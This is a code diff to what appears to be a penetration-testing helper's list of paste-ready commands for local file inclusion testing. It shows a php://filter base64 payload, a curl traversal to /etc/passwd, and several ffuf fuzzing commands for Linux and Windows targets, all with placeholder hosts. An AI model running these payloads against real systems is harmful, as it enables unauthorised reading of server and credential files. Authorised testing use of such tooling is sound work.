@@ -66,8 +66,12 @@ PASTABLES = {
             "php://filter/read=convert.base64-encode/resource=<FILE>",
             # curl note: use --path-as-is so the LFI portion isn't stripped
             "curl -sko- --path-as-is 'http://<TARGET>/<PAGE>?<PARAM>=../../../../etc/passwd'",
-            # primary parameter+LFI ffuf (operator runs manually)
-            "ffuf -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -w /usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt -fs <BASELINE>",
+            # confirm directory-traversal LFI (Linux): nested/encoded/null-byte bypasses
+            "ffuf -w /usr/share/wordlists/seclists/Fuzzing/LFI/LFI-Jhaddix.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs <SIZE>",
+            # confirm LFI when the file is executed instead of read
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-medium-files-lowercase.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=php://filter/read=convert.base64-encode/resource=FUZZ' -fs <SIZE>",
+            # confirm directory-traversal LFI (Windows)
+            "ffuf -w /usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt:FUZZ -u 'http://<TARGET>/<PAGE>?<PARAM>=FUZZ' -fs 0",
         ],
         "verbose": [
             # traversal filter bypasses
